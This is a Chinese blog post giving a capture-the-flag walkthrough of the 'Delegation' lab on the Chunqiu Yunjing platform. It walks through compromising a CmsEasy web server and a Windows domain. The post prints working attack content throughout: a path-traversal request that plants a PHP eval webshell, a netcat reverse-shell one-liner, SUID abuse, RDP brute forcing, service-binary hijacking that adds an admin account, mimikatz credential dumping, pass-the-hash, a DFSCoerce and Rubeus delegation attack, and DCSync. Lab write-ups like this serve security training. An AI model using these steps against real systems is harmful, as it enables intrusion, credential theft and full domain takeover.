<!DOCTYPE html>
<html lang="zh-CN">
    
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
    <meta name="description" content="春秋云镜Delegation-wp" />
    <meta name="hexo-theme-A4" content="v1.8.2" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>v2ish1yan</title>

    
        
<link rel="stylesheet" href="/css/a11y-dark.min.css">

        
<link rel="stylesheet" href="/css/reset.css">

        
<link rel="stylesheet" href="/css/markdown.css">

        
<link rel="stylesheet" href="/css/fonts.css">
 
         <!--注意：首页既不是post也不是page-->
        
            
<link rel="stylesheet" href="/css/waline.css">

        
        
        
<link rel="stylesheet" href="/css/ui.css">
 
        
<link rel="stylesheet" href="/css/style.css">


        
            <!--返回顶部css-->
            
<link rel="stylesheet" href="/css/returnToTop.css">

            
<link rel="stylesheet" href="/css/unicons.css">

        
        
            <!--目录-->
            
<link rel="stylesheet" href="/css/toc.css">

        
    
    

<meta name="generator" content="Hexo 6.3.0"></head>
    
    <style>
        :root {
            --waline-theme-color: #000000; 
            --waline-color: #000000; 
            --waline-border-color: #000000; 
            --waline-white: #000000; 
            --waline-bgcolor-light: #ffffff;  
        }
        body {
            color: #000000;
            background: #e4e4e4;
        }
        .post-md code {
            background: #212425;
            color: white; 
        }
        .year-font-color {
            color: #000000 !important;
        }
        .wl-card span.wl-nick {
            color: #000000; 
        }
        .wl-card .wl-badge {
            border: 1px solid #000000;
            color: #000000; 
        }
        .wl-btn {
            border: 1px solid #000000; 
            color:  #000000;  
        }
        .wl-btn.primary {
            color: #ffffff; 
        }
        .wl-header label {
            color: #000000;
        }
        a {
            color: rgb(239, 112, 96);
        }

        .post-md a {
            color: rgb(239, 112, 96);
        }

        .nav li a {
            color: rgb(239, 112, 96);
        }

        .archive-main a:link {
            color: rgb(239, 112, 96);
        }
        .archive-main a:visited {
            color: rgb(239, 112, 96); 
        }

        .archive li span {
            color: #000000;
        }

        .post-main-title {
            color: #000000;
        }

        .post-md h1,
        .post-md h2,
        .post-md h3,
        .post-md h4,
        .post-md h5,
        .post-md h6 {
            color: #000000;
        }

        [data-waline] p {
            color: #000000;
        }
        [data-waline] a {
            color: #000000;
        } 
        .wl-sort li.active {
            color: #000000;
        }

        .wl-card .wl-meta>span {
            background: #ffffff;
        }

        .paper {
            background: #e4e4e4;
        }

        .index-main {
            background: #ffffff;
        }

        .paper-main {
            background: #ffffff;
        }

        .wl-panel {
            background: #ffffff;
        }

        .archive li:nth-child(odd) {
            background: #ffffff;
            ;
        }

        .archive li:nth-child(even) {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(odd) td {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(even) td {
            background: #ffffff;
        }

    
        .progress-wrap::after {
            color: #000000; /* 箭头的颜色 */
        }
        .progress-wrap svg.progress-circle path {
	        stroke: #000000; /* 边框的颜色 */
        }
        .progress-wrap::before {
	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
         }

         .left-toc-container::-webkit-scrollbar-thumb {
            background-color: #000000; /* 设置滚动条拖动块的颜色 */
        }

        .bs-docs-sidebar .nav>.active>a,
        .bs-docs-sidebar .nav>li>a:hover,
        .bs-docs-sidebar .nav>li>a:focus {
            color: rgb(239, 112, 96);
            border-left-color: rgb(239, 112, 96);
        }
        .bs-docs-sidebar .nav>li>a {
            color:  #000000;
        }
    </style>

    
    <body>
        
            <div class="left-toc-container">
                <nav id="toc" class="bs-docs-sidebar"></nav>
            </div>
        
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    
<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">v2ish1yan</a> 
            <span class="description">一切都是兴趣使然</span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">首页</a></li>
            
        
            
                <li><a href="/list/">文章</a></li>
            
        
            
                <li><a href="/tags/">标签</a></li>
            
        
            
                <li><a href="/categories/">分类</a></li>
            
        
            
                <li><a href="/about/">关于</a></li>
            
        
            
                <li><a href="/friends/">友链</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--说明是文章post页面-->
                    
                        <div class="post-main">

    
        <div class="post-main-title">
            春秋云镜Delegation-wp
        </div>
      
    

    <div class="post-md">
        
            
                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="post-toc-text">端口扫描</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E8%8E%B7%E5%BE%97shell"><span class="post-toc-text">获得shell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag1"><span class="post-toc-text">flag1</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%90%AD%E5%BB%BA%E9%9A%A7%E9%81%93"><span class="post-toc-text">搭建隧道</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="post-toc-text">密码爆破</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="post-toc-text">本地提权</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag2"><span class="post-toc-text">flag2</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF"><span class="post-toc-text">收集域内信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%88%A9%E7%94%A8%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="post-toc-text">利用非约束性委派进行攻击</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#DCSync%E5%AF%BC%E5%87%BAhash"><span class="post-toc-text">DCSync导出hash</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag4"><span class="post-toc-text">flag4</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag3"><span class="post-toc-text">flag3</span></a></li></ol></li></ol>
            
        
        <h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre><code class="bash">rustscan -a 39.99.129.15 --range 1-65535
</code></pre>
<p>发现开启了端口</p>
<pre><code>Open 39.99.129.15:25
Open 39.99.129.15:21
Open 39.99.129.15:22
Open 39.99.129.15:110
Open 39.99.129.15:80
Open 39.99.129.15:3306
</code></pre>
<p>然后在拿去nmap跑一下服务</p>
<pre><code class="bash">nmap 39.99.129.15 -A -p 25,21,22,110,80,3306
</code></pre>
<p>80端口是CmsEasy 7_7_5</p>
<h2 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h2><p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306172104476.png" alt="image-20230617210036370"></p>
<p>先使用弱口令<code>admin/123456</code>登录后台</p>
<p><a target="_blank" rel="noopener" href="http://39.99.129.15/index.php?case=index&act=index&admin_dir=admin&site=default#index_connent">http://39.99.129.15/index.php?case=index&amp;act=index&amp;admin_dir=admin&amp;site=default#index_connent</a></p>
<p>然后执行打<a target="_blank" rel="noopener" href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD">poc</a></p>
<pre><code>POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1
Host: 39.99.129.15
Content-Length: 85
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://39.99.129.15
Referer: http://39.99.129.15/index.php?case=index&amp;act=index&amp;admin_dir=admin&amp;site=default
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=up4b4se5veftkpu0iaunbvrq07; loginfalse74c6352c5a281ec5947783b8a186e225=1; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313
Connection: close

sid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php phpinfo();eval($_POST[1]);?&gt;
</code></pre>
<p><code>.._d_</code> 代表 <code>../</code>，此处用来路径穿越</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306172114052.png" alt="image-20230617211452975"></p>
<p>访问<a target="_blank" rel="noopener" href="http://39.99.129.15/1.php%E8%8E%B7%E5%BE%97shell">http://39.99.129.15/1.php获得shell</a></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306172115310.png" alt="image-20230617211508228"></p>
<p>用蚁剑连接</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306172118536.png" alt="image-20230617211822480"></p>
<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>先提权获得flag1，使用suid提权</p>
<p>查找存在suid位的可执行文件</p>
<pre><code class="bash">find / -user root -perm -4000 -print 2&gt;/dev/null
/usr/bin/stapbpf
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/staprun
/usr/bin/diff
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
</code></pre>
<p>这里可以使用diff来读取flag1，为了可以使用命令上下文，所以先弹个shell</p>
<pre><code class="bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc &lt;ip&gt; 9999 &gt;/tmp/f
</code></pre>
<p>然后用python获取一个虚拟终端</p>
<pre><code class="bash">/usr/bin/python2.7 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
</code></pre>
<p>然后使用以下命令进行来读取flag</p>
<pre><code class="bash">LFILE=/home/flag/flag01.txt
/usr/bin/diff --line-format=%L /dev/null $LFILE
</code></pre>
<p>这里就是会打印两个文件不一样的地方，然后只输出$LFILE的值</p>
<p>得到<code>flag01: flag&#123;ac81f039-4878-4e5f-b4c9-78dde958dec0&#125;</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306172232018.png" alt="image-20230617223136082"></p>
<p>而且得到一个hint:<code>WIN19\Adrian</code>，是一个用户</p>
<p>然后上传fscan，扫一下内网，上传到<code>/tmp</code></p>
<p>查看网段，授予执行权限</p>
<p>然后扫描</p>
<pre><code class="bash">./fscan_386 -h 172.22.4.0/24 &gt; re.txt
</code></pre>
<p>得到</p>
<pre><code>start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.4.7      is alive
(icmp) Target 172.22.4.19     is alive
(icmp) Target 172.22.4.36     is alive
(icmp) Target 172.22.4.45     is alive
[*] Icmp alive hosts len is: 4
172.22.4.36:3306 open
172.22.4.45:445 open
172.22.4.19:445 open
172.22.4.7:445 open
172.22.4.45:139 open
172.22.4.19:139 open
172.22.4.7:139 open
172.22.4.45:135 open
172.22.4.19:135 open
172.22.4.7:135 open
172.22.4.45:80 open
172.22.4.36:80 open
172.22.4.36:21 open
172.22.4.7:88 open
172.22.4.36:22 open
[*] alive ports len is: 15
start vulscan
[*] NetInfo:
[*]172.22.4.19
   [-&gt;]FILESERVER
   [-&gt;]172.22.4.19
[*] 172.22.4.7  (Windows Server 2016 Datacenter 14393)
[*] NetInfo:
[*]172.22.4.45
   [-&gt;]WIN19
   [-&gt;]172.22.4.45
[*] NetInfo:
[*]172.22.4.7
   [-&gt;]DC01
   [-&gt;]172.22.4.7
[*] NetBios: 172.22.4.45     XIAORANG\WIN19                 
[*] NetBios: 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393 
[*] NetBios: 172.22.4.7      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 
[*] WebTitle: http://172.22.4.45        code:200 len:703    title:IIS Windows Server
[*] WebTitle: http://172.22.4.36        code:200 len:68100  title:中文网页标题
</code></pre>
<p>内网存在以下主机</p>
<pre><code>172.22.4.36 本机
172.22.4.45 XIAORANG\WIN19
172.22.4.7  DC DC01.xiaorang.lab
172.22.4.19 FILESERVER
</code></pre>
<h2 id="搭建隧道"><a href="#搭建隧道" class="headerlink" title="搭建隧道"></a>搭建隧道</h2><p>然后上传frp，进行内网代理</p>
<p><code>frpc.ini</code></p>
<pre><code class="ini">[common]
server_addr = &lt;vpsip&gt;
server_port = 9998

[socks5]
type = tcp
remote_port = 1000 #需要vps打开对应的端口
plugin = socks5
</code></pre>
<p><code>frps.ini</code></p>
<pre><code class="ini">[common]
bind_port = 9998
</code></pre>
<pre><code class="bash">./frps -c frps.ini
./frpc -c frpc.ini
</code></pre>
<p>然后在kali上的<code>/etc/proxychains4.conf</code></p>
<p>添加<code>socks5 &lt;vpsip&gt; 1000</code></p>
<h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>因为172.22.4.45的445端口，即smb服务是打开的，所以可以使用crackmapexec来爆破一下密码</p>
<pre><code class="bash">proxychains -q  crackmapexec smb  172.22.4.45 -u Adrian -p rockyou.txt    
</code></pre>
<p>但是发现不行。。用hydra试试</p>
<pre><code class="bash">proxychains -q hydra -l Adrian -P rockyou.txt  172.22.4.45 rdp -vV
</code></pre>
<p>可以发现密码<code>babygirl1</code>在多次尝试</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308101850272.png" alt="image-20230810184958141"></p>
<p>使用rdesktop进行登录</p>
<pre><code class="bash">proxychains4 -q rdesktop -u Adrian 172.22.4.45
</code></pre>
<p>会发现密码过期，修改后成功登录</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308101852618.png" alt="image-20230810185222500"></p>
<h2 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h2><p>然后就是要进行本地提权了，很戏剧的是当前主机上刚好有个PrivescCheck，这个是用来检测提权风险的</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308101906175.png" alt="image-20230810190600110"></p>
<p>而且报告都已经写出来了，但是保守起见，我还是再跑一次</p>
<pre><code class="powershell">Set-ExecutionPolicy Bypass -Scope process -Force
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Report result -Format HTML
</code></pre>
<p>发现谷歌浏览器的更新服务的注册完全可控那么我们就可以修改其二进制文件路径，来进行提权</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308101923708.png" alt="image-20230810192323644"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308101923826.png" alt="image-20230810192342787"></p>
<p>将他服务对应的二进制文件修改为<code>cmd.exe</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308101954880.png" alt="image-20230810195450821"></p>
<p>然后开启服务，但是发现会报错</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308102004398.png" alt="image-20230810200433360"></p>
<p>去网上搜了之后也没有找到是为什么</p>
<p>我再用msfvenom生成一个适用于服务的二进制文件</p>
<pre><code class="bash">msfvenom -p windows/x64/exec cmd=&quot;C:\windows\system32\cmd.exe&quot; --platform windows -f exe-service &gt; v2.exe
</code></pre>
<p>这里我是在使用rdesktop修改密码后再使用remmina进行登录的，因为remmina用共享文件夹更加方便</p>
<p>上传上去后，再修改一下服务的二进制文件</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308102014811.png" alt="image-20230810201416740"></p>
<p>md，虽然不会报错，但是这里的cmd好像不会弹出来</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308102016665.png" alt="image-20230810201621604"></p>
<p>那就试试执行bat文件来创建一个本地管理员用户</p>
<pre><code class="bash">msfvenom -p windows/x64/exec cmd=&quot;C:\windows\system32\cmd.exe /c C:\Users\Adrian\1.bat&quot; --platform windows -f exe-service &gt; v2.exe
</code></pre>
<p>1.bat内容</p>
<pre><code class="bat">net user v2i 159357@qwe /add
net localgroup administrators v2i /add
</code></pre>
<p>然后再次开启服务，发现用户成功创建，被为本地管理员</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308102019518.png" alt="image-20230810201950474"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308102020508.png" alt="image-20230810202023477"></p>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>再用新账户进行登录，然后成功拿到flag2</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308102021342.png" alt="image-20230810202151275"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308102021134.png" alt="image-20230810202159073"></p>
<p>使用mimikatz来获取其他用户的hash</p>
<pre><code class="bash">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit
</code></pre>
<p>抓取到的hash里有一个机器账户，且他为域内用户</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308112039938.png" alt="image-20230811203918853"></p>
<h2 id="收集域内信息"><a href="#收集域内信息" class="headerlink" title="收集域内信息"></a>收集域内信息</h2><p>pth一下，直接用mimikatz</p>
<pre><code class="bash">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:WIN19$ /domain:xiaorang.lab /ntlm:a8154bffa1e14f4d428f35a4361c2f72&quot; exit
</code></pre>
<p>然后弹出了一个cmd，成功查找域内用户，即证明我们登录到了WIN19$账户</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308112042983.png" alt="image-20230811204211916"></p>
<p>然后是上传Sharphound再配合Bloodhound收集域内信息</p>
<p>要用新弹出的cmd输入命令</p>
<pre><code class="bash">SharpHound.exe --CollectionMethods All --Domain xiaorang.lab
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308112050913.png" alt="image-20230811205040834"></p>
<p>然后本地开启Bloodhound进行分析</p>
<pre><code class="bash">sudo neo4j console
./BloodHound --no-sandbox
</code></pre>
<p>查看到最短到约束性委派主机的路径</p>
<p>可以看到DC01和WIN19主机都存在非约束委派</p>
<h2 id="利用非约束性委派进行攻击"><a href="#利用非约束性委派进行攻击" class="headerlink" title="利用非约束性委派进行攻击"></a>利用非约束性委派进行攻击</h2><p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308112105149.png" alt="image-20230811210553062"></p>
<p>我们当前WIN19账户可控，所以思路就是让DC01账户向WIN19账户发送身份验证请求，然后保存其TGT。因为WIN19开启了非约束性委派，所以我们可以利用DC01的TGT去做任何他能做到的事情</p>
<p>先把Rebeus上传上去，然后开启监听</p>
<pre><code class="bash">Rubeus.exe monitor /interval:1  /filteruser:DC01
</code></pre>
<p>然后就是思考，可以使用什么漏洞强制对方向我们这个主机发送身份验证了</p>
<p>那就一个个试吧，最后发现可以使用<code>DFSCoerce</code></p>
<pre><code class="bash">proxychains4 -q python3 dfscoerce.py -u WIN19\$ -d xiaorang.lab -hashes :a8154bffa1e14f4d428f35a4361c2f72  win19  172.22.4.7   
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308112203606.png" alt="image-20230811220309540"></p>
<p>等待一下，Rebeus就能获取到一个base64编码的TGT</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308112203143.png" alt="image-20230811220355068"></p>
<p>然后使用Rebeus注入这个TGT</p>
<pre><code class="bash">Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD61VkdmE++6V9B9l8xaABPeaXTs8WEMNQSNlkknQBTX6GI59TbxiPJZkp+2kEjWHdJVDSQONAjvwCdfMGEkyLiXZKwowRxveW1PvhPBMch9XyftCek3pcbPnEFmIGCqHFA9CAxbrnlwz6YQci/gr0weuUpMoZeF20wb6D5wlzrfSHsrS5gpgf/pUTe+mRhjJPdedKLSGxFAiHj0wc66c9NJa606BNsa/YroH1K+EAQ0mOtfzPpOfN9iEdsTbZRhz6Oq/jrSoqnpnmxyf/ybaSookQBAe/c89V8HRNwkuZEhvTCpAdlH24U1ImZ3cok6BFI43HauYBI1BgRdOUygzkrf8mmseL5ie0OgzCLgjwTcDiCko+b1EvrXBdstS9QyhiWrSI1qB+uuhg9A1FPCkR4UdRz25ySbCCJgwrtd658NVl5XkhDzSpPgeBUjLuJqUiKodFPPZCEiCMwjKHyxat1QwkHjSZQaigqn7rUykyXSuMCTNLrIQjIOw1Wg8gjpR2BH8ID/fzwk9VIGUxY1Cr2DFqGkjh5McZoZet1h8nrut+jmEFiy5nUrwBZIPfPGPdt+0wZjvluco2S+dkui5ora/pWfhLRV8T09NLKQgUEGeWjifHwFaGu6Wo+A1QWsWAQvYNqtojaHkKj0TD9iY+2Y7Oft1U53to/DbIbYmC4DgRoqT2C7Xqpb9A4Xk/vS0U0+BynbUPDz+OqAEicnW4RyRDQHk/cZPmn93uyJsstcIA0QQpIaSVtJNwzZ3TrRsPYcijTDfmO/QpB5FiEFRW9mrdpLUPcbpScj0787ZdXryqd3D0eMNBcPAz5ydiKZIlVStowgPMF1Iu1xQxO6xKoPnoFKfHFhuw9Uw/5azaXb42+uoHaap3y8LndaUDm+cCCCaKZ/2+XCKqt80kbCRuMUPdmlG1S3+6QIOMFYS5DV9bdZOmAgJvsj0HUjUsMk6WlT5j/br4Z6EZBHTBgU/Gy/uSND09updiuxvNB9bIBJRK+aw4PeZPw/SXYeJllY8uYZrXcimLVF8L6D0EaVlF8Fb7PzOuPyHizpHXds1RpTQWebB6WSRp7r17eJgRb+6wRBUxyxRvsjaPr41mHZJPf2mu3E1yApPkBTzaHafPKwZRP6zhLhH8v3XxlZ+okufjPAcehuRqbx1H42QqFBAX6tZlfCalNVmdkk68aI+9CcZ74S81XXNNwmzXLy0tJRVmphGDabHnCwMpJ0k4rFZSI3g4qFvUEJHicUkr9skn4U/sq+SyxYvuKTyTdxIgfA+VaP/5seD72IdSPfZGMkvwsUzeUGdeCA6SRydbfGmhyBMYRw5IEBBsH1h19jBtq6WdbaYjGwySUpfItVMIujkfupsdg+9g1Hyogq3gYR3zZS1sbNYm2odew0DuxAGli3SYEC1dG5E9n2AC4EPApo3q410OkFWcW2GW7oryXIjf2jgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCBHuQlJ550MC+BvZ8IPAWeSCGYzET0xeTiIT3teMzCS0aEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDIzMDgxMTExNTM1NFqmERgPMjAyMzA4MTEyMTUzNTRapxEYDzIwMjMwODE4MTE1MzU0WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==
</code></pre>
<p>然后使用psexec来访问域控主机</p>
<pre><code class="bash">PsExec64.exe \\172.22.4.7 cmd.exe
</code></pre>
<h2 id="DCSync导出hash"><a href="#DCSync导出hash" class="headerlink" title="DCSync导出hash"></a>DCSync导出hash</h2><p>貌似不行，那就试着用mimikatz通过DCSync来导出域控的hash</p>
<pre><code class="bash">mimikatz &quot;lsadump::dcsync /domain:xiaorang.lab /user:administrator&quot; exit 
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308112216298.png" alt="image-20230811221630243"></p>
<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>然后使用psexec.py进行横向移动</p>
<pre><code class="bash">proxychains4 -q python3 psexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 administrator@172.22.4.7
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308112219414.png" alt="image-20230811221945323"></p>
<p>获取flag04</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308112224647.png" alt="image-20230811222428599"></p>
<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>同理，登录FILESERVER的主机</p>
<pre><code class="bash">proxychains4 -q python3 psexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/administrator@172.22.4.19 
</code></pre>
<p>获得flag03</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202308112229673.png" alt="image-20230811222959620"></p>

    </div>

    <div class="post-meta">
        <i>
        
            <span>2023-08-11</span>
            
                <span>该篇文章被 v2ish1yan</span>
            
            
             
                <span>归为分类:
                    
                    
                        <a href='/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/'>
                            春秋云镜
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    
        
    <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
         
    </div>
    
        

    <div id="waline"></div>
    <script type="module"  >
        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
        function loadWaline() {
            init({
                el: '#waline',
                serverURL: 'https://a4-talk.vercel.app',
                lang: 'zh-CN',
                dark: 'body[class~="dark-mode"]',
                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
                search: false, // 禁止表情包搜索
                reaction: false, // 对文章打分
                pageview: false, // 浏览量统计
                comment: false, // 评论数统计

                locale: {
                    placeholder: '欢迎评论', 
                    sofa: ''
                },
            });
            
        }
        window.addEventListener('DOMContentLoaded', loadWaline);
    </script>



    
    
    
    </div>


     
</div>



                                      
                    
                    
                    <div class="footer">
    
        <span> 
            © 1949-2024 China 

            
                

            
        </span>
    
</div>
<!--这是指一条线往下的内容-->
<div class="footer-last">
    
            <span>🌊面朝大海，春暖花开🌸</span>
            
                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
            
    
</div>


   
    
<script src="/js/highlight.min.js"></script>

    
<script src="/js/highlightjs-line-numbers.js"></script>


    
<script src="/js/randomHeaderContent.js"></script>

    <!--回到顶部按钮-->
    
        
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>

        
<script src="/js/returnToTop.js"></script>

    

    <!--目录-->
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
        
<script src="/js/toc.js"></script>

    



<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>



                </div>
            
            
                <!-- 回到顶部的按钮-->  
                <div class="progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
    </body>


    <!--暗黑模式-->
    <script src="/js/darkmode-js.min.js"></script>
    <script>
        function addDarkmodeWidget() {
        const options = {
            bottom: '53px', // default: '32px'
            right: 'unset', // default: '32px'
            left: '42px', // default: 'unset'
            time: '0.3s', // default: '0.3s'
            mixColor: '#fff', // default: '#fff'
            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
            buttonColorDark: '#100f2c',  // default: '#100f2c'
            buttonColorLight: '#fff', // default: '#fff'
            saveInCookies: true, // default: true,
            label: '🌓', // default: ''
            autoMatchOsTheme: true // default: true
        }
    
        const darkmode = new Darkmode(options);
        darkmode.showWidget();
        
        }
        window.addEventListener('load', addDarkmodeWidget);
    </script>
  
</html>